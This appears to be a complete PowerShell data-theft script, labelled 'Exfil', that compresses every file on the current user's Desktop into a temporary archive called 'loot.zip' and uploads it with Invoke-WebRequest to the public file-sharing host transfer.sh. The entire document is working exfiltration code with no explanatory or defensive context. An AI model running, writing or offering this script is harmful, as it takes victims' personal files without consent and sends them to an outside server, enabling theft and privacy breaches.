# Exfil - Archive & upload Desktop contents
$src = "$env:USERPROFILE\\Desktop"
$zip = "$env:TEMP\\loot.zip"
Compress-Archive -Path "$src\\*" -DestinationPath $zip
Invoke-WebRequest -Uri "https://transfer.sh/loot.zip" -InFile $zip -Method Put
